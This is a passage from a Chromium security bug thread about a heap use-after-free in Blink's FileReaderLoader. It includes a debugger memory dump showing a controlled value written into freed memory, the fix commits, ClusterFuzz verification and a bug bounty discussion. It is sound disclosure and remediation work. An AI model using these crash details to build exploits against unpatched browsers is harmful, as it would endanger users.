			expected_content_size	0x0000000000414141	unsigned __int64
			total_size	0x0000000000414141	unsigned __int64

		
Memory block of FileReaderLoader after it's freed:

	0x57284390  cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
	0x572843A0  cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
	0x572843B0  cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
	0x572843C0  cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
	0x572843D0  cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
	0x572843E0  cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
	0x572843F0  cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
	0x57284400  cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
	0x57284410  cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
	0x57284420  cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
	0x57284430  cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
	0x57284440  41 41 41 00 00 00 00 00 cd cd cd cd cd cd cd cd  AAA.....ÍÍÍÍÍÍÍÍ
	0x57284450  cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd cd  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
	0x57284460  57 28 45 40 00 00 00 00 00 00 00 00 00 00 00 00  W(E@............


	-		this	0x57284390 {read_type_=0xcdcdcdcd client_=0xcdcdcdcd {...} encoding_={name_=0xcdcdcdcd <Error reading characters of string.> } ...}	blink::FileReaderLoader *
	+		blink::mojom::blink::BlobReaderClient	{...}	blink::mojom::blink::BlobReaderClient
			read_type_	0xcdcdcdcd	blink::FileReaderLoader::ReadType
	+		client_	0xcdcdcdcd {...}	blink::FileReaderLoaderClient *
	+		encoding_	{name_=0xcdcdcdcd <Error reading characters of string.> }	WTF::TextEncoding
	+		data_type_	[???] ???	WTF::String
	+		raw_data_	unique_ptr {bytes_used_=??? variable_capacity_=??? buffer_=[???] ??? ??? }	std::unique_ptr<WTF::ArrayBufferBuilder,std::default_delete<WTF::ArrayBufferBuilder> >
			is_raw_data_converted_	true (0xcd)	bool
	+		array_buffer_result_	{...}	blink::Persistent<blink::DOMArrayBuffer>
	+		string_result_	[???] ???	WTF::String
	+		decoder_	unique_ptr {options_={encoding_detection_option_=??? content_type_=??? default_encoding_={name_=??? } ...} encoding_=...}	std::unique_ptr<blink::TextResourceDecoder,std::default_delete<blink::TextResourceDecoder> >
			finished_loading_	true (0xcd)	bool
			bytes_loaded_	0xcdcdcdcdcdcdcdcd	__int64
			total_bytes_	0xcdcdcdcdcdcdcdcd	__int64
			memory_usage_reported_to_v8_	0xcdcdcdcdcdcdcdcd	__int64
			error_code_	0xcdcdcdcd	blink::FileError::ErrorCode
	+		consumer_handle_	{handle_={...} }	mojo::ScopedHandleBase<mojo::DataPipeConsumerHandle>
	+		handle_watcher_	{sequence_checker_={...} arming_policy_=MANUAL | 0xcdcdcdcc (0xcdcdcdcd) task_runner_=[???] 0xcdcdcdcd {...} ...}	mojo::SimpleWatcher
	+		binding_	{internal_state_={stub_={sink_=0xcdcdcdcd {...} } } }	mojo::Binding<blink::mojom::blink::BlobReaderClient,mojo::RawPtrImplRefTraits<blink::mojom::blink::BlobReaderClient> >
			expected_content_size_	0x0000000000414141	__int64
			received_all_data_	true (0xcd)	bool
			received_on_complete_	true (0xcd)	bool
			started_loading_	true (0xcd)	bool
			expected_content_size	0x0000000000414141	unsigned __int64
			total_size	0x0000000000414141	unsigned __int64

### sh...@chromium.org (2018-04-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-04-23)

[Empty comment from Monorail migration]

### me...@chromium.org (2018-04-23)

Huh, this is weird... if FileReaderLoader is deleted (as is clearly the case here), its mojo::Binding binding_ member should also be deleted, which as far as I know should prevent any more messages from being dispatched through that binding... But clearly something isn't working right here.

### me...@chromium.org (2018-04-23)

[Empty comment from Monorail migration]

### me...@chromium.org (2018-04-23)

[Empty comment from Monorail migration]

### bu...@chromium.org (2018-04-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/a261ea1c56ef16fc0fc4af1e440feb302d577716

commit a261ea1c56ef16fc0fc4af1e440feb302d577716
Author: Marijn Kruisselbrink <mek@chromium.org>
Date: Mon Apr 23 20:17:19 2018

Fix use-after-free in FileReaderLoader.

Anything that calls out to client_ can cause FileReaderLoader to be
destroyed, so make sure to check for that situation.

Bug: 835639
Change-Id: I57533d41b7118c06da17abec28bbf301e1f50646
Reviewed-on: https://chromium-review.googlesource.com/1024450
Commit-Queue: Marijn Kruisselbrink <mek@chromium.org>
Commit-Queue: Daniel Murphy <dmurph@chromium.org>
Reviewed-by: Daniel Murphy <dmurph@chromium.org>
Cr-Commit-Position: refs/heads/master@{#552807}
[modify] https://crrev.com/a261ea1c56ef16fc0fc4af1e440feb302d577716/third_party/blink/renderer/core/fileapi/file_reader_loader.cc
[modify] https://crrev.com/a261ea1c56ef16fc0fc4af1e440feb302d577716/third_party/blink/renderer/core/fileapi/file_reader_loader.h


### me...@chromium.org (2018-04-23)

[Empty comment from Monorail migration]

[Monorail components: -Internals>Mojo]

### cl...@chromium.org (2018-04-24)

ClusterFuzz has detected this issue as fixed in range 552805:552808.

Detailed report: https://clusterfuzz.com/testcase?key=5674396262596608

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free WRITE 1
Crash Address: 0x613000049608
Crash State:
  blink::FileReaderLoader::OnCalculatedSize
  blink::mojom::blink::BlobReaderClientStubDispatch::Accept
  mojo::InterfaceEndpointClient::HandleValidatedMessage
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=523898:523900
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=552805:552808

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5674396262596608

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2018-04-24)

ClusterFuzz testcase 5674396262596608 is verified as fixed, so closing issue as verified.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2018-04-24)

[Empty comment from Monorail migration]

### me...@chromium.org (2018-04-24)

I don't know if this is serious enough to also warrant merging back to M66, but just in case, adding that merge request as well...

### sh...@chromium.org (2018-04-24)

This bug requires manual review: Request affecting a post-stable build
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), josafat@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ab...@chromium.org (2018-04-24)

+ awhalley - can you please review how critical this is?

### sh...@chromium.org (2018-04-24)

Your change meets the bar and is auto-approved for M67. Please go ahead and merge the CL to branch 3396 manually. Please contact milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), kbleicher@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@google.com (2018-04-24)

We can wait to 67.

### bu...@chromium.org (2018-04-24)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/4c85c11d136df02e49f14d18f3b97bbf9413772f

commit 4c85c11d136df02e49f14d18f3b97bbf9413772f
Author: Marijn Kruisselbrink <mek@chromium.org>
Date: Tue Apr 24 20:40:29 2018

Fix use-after-free in FileReaderLoader.

Anything that calls out to client_ can cause FileReaderLoader to be
destroyed, so make sure to check for that situation.

TBR=mek@chromium.org

(cherry picked from commit a261ea1c56ef16fc0fc4af1e440feb302d577716)

Bug: 835639
Change-Id: I57533d41b7118c06da17abec28bbf301e1f50646
Reviewed-on: https://chromium-review.googlesource.com/1024450
Commit-Queue: Marijn Kruisselbrink <mek@chromium.org>
Commit-Queue: Daniel Murphy <dmurph@chromium.org>
Reviewed-by: Daniel Murphy <dmurph@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#552807}
Reviewed-on: https://chromium-review.googlesource.com/1026524
Reviewed-by: Marijn Kruisselbrink <mek@chromium.org>
Cr-Commit-Position: refs/branch-heads/3396@{#265}
Cr-Branched-From: 9ef2aa869bc7bc0c089e255d698cca6e47d6b038-refs/heads/master@{#550428}
[modify] https://crrev.com/4c85c11d136df02e49f14d18f3b97bbf9413772f/third_party/blink/renderer/core/fileapi/file_reader_loader.cc
[modify] https://crrev.com/4c85c11d136df02e49f14d18f3b97bbf9413772f/third_party/blink/renderer/core/fileapi/file_reader_loader.h


### aw...@google.com (2018-04-30)

[Empty comment from Monorail migration]

### aw...@google.com (2018-05-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-05-04)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-05-04)

Nice one loobenyang@ - $3,000 for this one!

### aw...@chromium.org (2018-05-04)

[Empty comment from Monorail migration]

### lo...@gmail.com (2018-05-07)

Thanks Andrew and the team for the quick fix.

Does https://crbug.com/chromium/835639#c9 quality for a higher reward?
https://bugs.chromium.org/p/chromium/issues/detail?id=835639#c9

Sure this time, I did not demonstrate the control of EIP register, but it does demonstrate the control of the value used to corrupt the memory. The exploit of this issue is very likely. And according to the Chrome Reward Program Rules control of EIP is not the only criteria for higher reward.

"[2] A report that includes a minimized test case and the versions of Chrome affected by the bug. You will also demonstrate that exploitation of this vulnerability is very likely (e.g. good control of EIP or another CPU register). Your report should be brief and well written with only necessary detail and commentary."

If you have already taken it into consideration and the amount was decided based on it. Then just ignore this comment. Thanks again.


### aw...@google.com (2018-05-14)

Hi loobenyang@ - thanks for asking. We did indeed take this into account, I'm afraid (that was one of the reasons we raised it from medium to high in https://crbug.com/chromium/835639#c27). Cheers!

### aw...@chromium.org (2018-05-29)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-05-29)

[Empty comment from Monorail migration]

### be...@chromium.org (2018-06-15)

[Empty comment from Monorail migration]

[Monorail components: Blink>Storage>FileAPI]

### be...@chromium.org (2018-06-15)

[Empty comment from Monorail migration]

[Monorail components: -Blink>FileAPI]

### sh...@chromium.org (2018-07-31)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2019-01-04)

[Empty comment from Monorail migration]

### is...@google.com (2019-01-04)

This issue was migrated from crbug.com/chromium/835639?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091179)*
